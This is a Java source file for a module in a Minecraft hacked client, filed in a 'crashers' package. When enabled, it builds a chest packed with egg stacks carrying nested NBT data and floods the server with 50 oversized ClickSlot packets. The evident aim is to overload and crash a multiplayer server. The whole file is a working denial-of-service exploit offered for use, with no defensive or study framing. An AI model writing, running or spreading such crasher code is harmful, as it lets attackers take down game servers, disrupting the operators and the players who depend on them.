package voltik.qpa.czopekhookreborn.feature.module.modules.crashers;

import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.MinecraftClient;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.ContainerComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import voltik.qpa.czopekhookreborn.feature.module.Categories;
import voltik.qpa.czopekhookreborn.feature.module.Module;
import voltik.qpa.czopekhookreborn.feature.module.ModuleInfo;
import org.lwjgl.glfw.GLFW;
import net.minecraft.nbt.NbtCompound;

import java.util.ArrayList;
import java.util.List;

@ModuleInfo(category = Categories.MISC, name = "szkudlar1", description = "Swings bigdick on the server to make it heavy lift it", keybind = GLFW.GLFW_KEY_G)
public class Szudlar1 extends Module {

    private static int packets = 50;
    private static int mapSize = 128;


    @Override
    public void onTick() {
    }

    @Override
    protected void onEnable() {
        MinecraftClient mc = MinecraftClient.getInstance();

        if (mc.player == null || mc.getNetworkHandler() == null) {
            this.disable();
            return;
        }

        mc.player.sendMessage(Text.literal("workuje"), false);

        try {
            ItemStack itemStack = getComponents(256, 28);
            Int2ObjectMap<ItemStack> modified = new Int2ObjectOpenHashMap<>();

            for (int j = 0; j < mapSize; j++) {
                modified.put(j, itemStack);
            }


            for (int i = 0; i < packets; i++) {

                mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
                        0,
                        1,
                        10,
                        1,
                        SlotActionType.PICKUP,
                        itemStack,
                        modified
                ));
            }

            mc.player.sendMessage(Text.literal("work skonczony"), false);
        } catch (Exception e) {
            e.printStackTrace();
        }

        this.disable();
    }

    private ItemStack getComponents(int items, int count) {
        List<ItemStack> eggsList = new ArrayList<>(items);

        for (int i = 0; i < items; i++) {
            NbtCompound root = new NbtCompound();

            for (int j = 0; j < count; j++) {
                root.put("", new NbtCompound());
            }

            ItemStack egg = new ItemStack(Items.EGG, 64);
            egg.set(DataComponentTypes.CUSTOM_DATA, net.minecraft.component.type.NbtComponent.of(root));

            eggsList.add(egg);
        }

        ItemStack chest = new ItemStack(Items.CHEST, 64);
        ContainerComponent component = ContainerComponent.fromStacks(eggsList);
        chest.set(DataComponentTypes.CONTAINER, component);

        return chest;
    }


    @Override
    protected void onDisable() {
    }
}
